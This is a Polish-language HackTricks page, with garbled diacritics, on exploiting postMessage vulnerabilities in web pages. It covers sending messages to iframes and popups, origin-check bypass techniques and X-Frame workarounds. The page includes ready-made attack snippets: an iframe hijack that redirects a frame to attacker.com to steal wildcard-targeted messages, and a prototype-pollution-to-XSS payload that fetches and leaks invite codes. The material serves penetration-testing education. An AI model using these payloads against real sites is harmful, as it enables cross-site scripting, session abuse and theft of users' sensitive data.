# PostMessage Vulnerabilities

## PostMessage Vulnerabilities

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}


## Wylij **PostMessage**

**PostMessage** u偶ywa nastpujcej funkcji do wysyania wiadomoci:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Zauwa偶, 偶e **targetOrigin** mo偶e by '\*' lub adresem URL, takim jak _https://company.com._\
W **drugim scenariuszu** **wiadomo mo偶e by wysyana tylko do tej domeny** (nawet jeli pochodzenie obiektu okna jest inne).\
Jeli u偶yto **znaku wieloznacznego**, **wiadomoci mog by wysyane do dowolnej domeny** i bd wysyane do pochodzenia obiektu Window.

### Atakowanie iframe i znak wieloznaczny w **targetOrigin**

Jak wyjaniono w [**tym raporcie**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/), jeli znajdziesz stron, kt贸ra mo偶e by **iframed** (brak ochrony `X-Frame-Header`) i kt贸ra **wysya wra偶liwe** wiadomoci za pomoc **postMessage** u偶ywajc **znaku wieloznacznego** (\*), mo偶esz **zmodyfikowa** **pochodzenie** **iframe** i **wyciek** **wra偶liwej** wiadomoci do domeny kontrolowanej przez Ciebie.\
Zauwa偶, 偶e jeli strona mo偶e by iframed, ale **targetOrigin** jest **ustawiony na adres URL, a nie na znak wieloznaczny**, ten **sztuczny trik nie zadziaa**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## wykorzystanie addEventListener

**`addEventListener`** to funkcja u偶ywana przez JS do deklarowania funkcji, kt贸ra **oczekuje `postMessages`**.\
Zostanie u偶yty kod podobny do poni偶szego:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
Zauwa偶 w tym przypadku, jak **pierwsz rzecz**, kt贸r kod robi, jest **sprawdzanie pochodzenia**. To jest strasznie **wa偶ne**, szczeg贸lnie jeli strona ma zamiar zrobi **cokolwiek wra偶liwego** z otrzymanymi informacjami (jak zmiana hasa). **Jeli nie sprawdzi pochodzenia, atakujcy mog zmusi ofiary do wysyania dowolnych danych do tych punkt贸w kocowych** i zmienia hasa ofiar (w tym przykadzie).

### Enumeracja

Aby **znale藕 nasuchiwacze zdarze** na bie偶cej stronie, mo偶esz:

* **Szukaj** w kodzie JS `window.addEventListener` i `$(window).on` (_wersja JQuery_)
* **Wykonaj** w konsoli narzdzi deweloperskich: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1).png>)

* **Przejd藕 do** _Elements --> Event Listeners_ w narzdziach deweloperskich przegldarki

![](<../../.gitbook/assets/image (396).png>)

* U偶yj **rozszerzenia przegldarki** takiego jak [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) lub [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Te rozszerzenia przegldarki **przechwyc wszystkie wiadomoci** i poka偶 je Tobie.

### Ominicia sprawdzania pochodzenia

* Atrybut **`event.isTrusted`** jest uwa偶any za bezpieczny, poniewa偶 zwraca `True` tylko dla zdarze generowanych przez prawdziwe dziaania u偶ytkownika. Cho trudno go obej, jeli jest poprawnie zaimplementowany, jego znaczenie w kontrolach bezpieczestwa jest zauwa偶alne.
* U偶ycie **`indexOf()`** do walidacji pochodzenia w zdarzeniach PostMessage mo偶e by podatne na ominicie. Przykad ilustrujcy t podatno to:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```
* Metoda **`search()`** z `String.prototype.search()` jest przeznaczona do wyra偶e regularnych, a nie do cig贸w. Przekazanie czegokolwiek innego ni偶 wyra偶enie regexp prowadzi do niejawnej konwersji na regex, co czyni t metod potencjalnie niebezpieczn. Dzieje si tak, poniewa偶 w regexie kropka (.) dziaa jako znak wieloznaczny, co pozwala na ominicie walidacji za pomoc specjalnie skonstruowanych domen. Na przykad:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```
* Funkcja **`match()`**, podobnie jak `search()`, przetwarza regex. Jeli regex jest 藕le skonstruowany, mo偶e by podatny na ominicie.
* Funkcja **`escapeHtml`** ma na celu sanitacj danych wejciowych poprzez ucieczk znak贸w. Jednak nie tworzy nowego obiektu z ucieczk, lecz nadpisuje waciwoci istniejcego obiektu. To zachowanie mo偶e by wykorzystane. Szczeg贸lnie, jeli obiekt mo偶e by manipulowany w taki spos贸b, 偶e jego kontrolowana waciwo nie uznaje `hasOwnProperty`, `escapeHtml` nie zadziaa zgodnie z oczekiwaniami. To jest pokazane w poni偶szych przykadach:

* Oczekiwana awaria:

```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```
* Ominicie ucieczki:

```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

W kontekcie tej podatnoci, obiekt `File` jest szczeg贸lnie podatny na wykorzystanie z powodu swojej waciwoci `name` tylko do odczytu. Ta waciwo, gdy jest u偶ywana w szablonach, nie jest sanitizowana przez funkcj `escapeHtml`, co prowadzi do potencjalnych zagro偶e bezpieczestwa.
* Waciwo `document.domain` w JavaScript mo偶e by ustawiana przez skrypt w celu skr贸cenia domeny, co pozwala na bardziej lu藕ne egzekwowanie polityki tego samego pochodzenia w obrbie tej samej domeny nadrzdnej.

### e.origin == window.origin omijanie

Podczas osadzania strony internetowej w **sandboxed iframe** za pomoc %%%%%%, wa偶ne jest, aby zrozumie, 偶e pochodzenie iframe bdzie ustawione na null. Jest to szczeg贸lnie wa偶ne w przypadku **atrybut贸w sandbox** i ich implikacji na bezpieczestwo i funkcjonalno.

Poprzez okrelenie **`allow-popups`** w atrybucie sandbox, ka偶de okno popup otwarte z wntrza iframe dziedziczy ograniczenia sandboxu swojego rodzica. Oznacza to, 偶e chyba 偶e atrybut **`allow-popups-to-escape-sandbox`** jest r贸wnie偶 uwzgldniony, pochodzenie okna popup jest r贸wnie偶 ustawione na `null`, zgodnie z pochodzeniem iframe.

W konsekwencji, gdy popup jest otwierany w tych warunkach i wiadomo jest wysyana z iframe do popupu za pomoc **`postMessage`**, zar贸wno nadawca, jak i odbiorca maj swoje pochodzenia ustawione na `null`. Ta sytuacja prowadzi do scenariusza, w kt贸rym **`e.origin == window.origin`** ocenia si jako prawda (`null == null`), poniewa偶 zar贸wno iframe, jak i popup dziel t sam warto pochodzenia `null`.

Aby uzyska wicej informacji **przeczytaj**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### Ominicie e.source

Mo偶liwe jest sprawdzenie, czy wiadomo pochodzi z tego samego okna, w kt贸rym skrypt nasuchuje (szczeg贸lnie interesujce dla **Content Scripts z rozszerze przegldarki**, aby sprawdzi, czy wiadomo zostaa wysana z tej samej strony):
```javascript
// If its not, return immediately.
if( received_message.source !== window ) {
return;
}
```
Mo偶esz wymusi, aby **`e.source`** wiadomoci byo r贸wne null, tworzc **iframe**, kt贸ry **wysya** **postMessage** i jest **natychmiast usuwany**.

Aby uzyska wicej informacji **przeczytaj:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### Obejcie nag贸wka X-Frame

Aby przeprowadzi te ataki, najlepiej bdzie, jeli bdziesz m贸g **umieci stron internetow ofiary** w `iframe`. Jednak niekt贸re nag贸wki, takie jak `X-Frame-Header`, mog **zapobiega** temu **zachowaniu**.\
W takich scenariuszach mo偶esz nadal u偶y mniej dyskretnego ataku. Mo偶esz otworzy now kart do podatnej aplikacji internetowej i komunikowa si z ni:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Kradzie偶 wiadomoci wysanej do dziecka przez zablokowanie strony g贸wnej

Na poni偶szej stronie mo偶esz zobaczy, jak mo偶na ukra **wra偶liwe dane postmessage** wysane do **dziecicego iframe** przez **zablokowanie** **strony g贸wnej** przed wysaniem danych i wykorzystanie **XSS w dziecku** do **ujawnienia danych** przed ich odebraniem:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### Kradzie偶 wiadomoci przez modyfikacj lokalizacji iframe

Jeli mo偶esz umieci stron w iframe bez nag贸wka X-Frame, kt贸ra zawiera inny iframe, mo偶esz **zmieni lokalizacj tego dziecicego iframe**, wic jeli odbiera **postmessage** wysane za pomoc **wildcard**, atakujcy m贸gby **zmieni** ten iframe **origin** na stron **kontrolowan** przez niego i **ukra** wiadomo:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage do zanieczyszczenia prototypu i/lub XSS

W scenariuszach, w kt贸rych dane wysyane przez `postMessage` s wykonywane przez JS, mo偶esz **umieci** **stron** w **iframe** i **wykorzysta** **zanieczyszczenie prototypu/XSS**, wysyajc exploit za pomoc `postMessage`.

Kilka **bardzo dobrze wyjanionych XSS przez `postMessage`** mo偶na znale藕 pod adresem [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

Przykad exploita do wykorzystania **zanieczyszczenia prototypu, a nastpnie XSS** przez `postMessage` do `iframe`:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
Dla **wicej informacji**:

* Link do strony o [**zanieczyszczeniu prototypu**](../deserialization/nodejs-proto-prototype-pollution/)
* Link do strony o [**XSS**](../xss-cross-site-scripting/)
* Link do strony o [**zanieczyszczeniu prototypu po stronie klienta do XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## Odniesienia

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Aby wiczy: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)


{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}
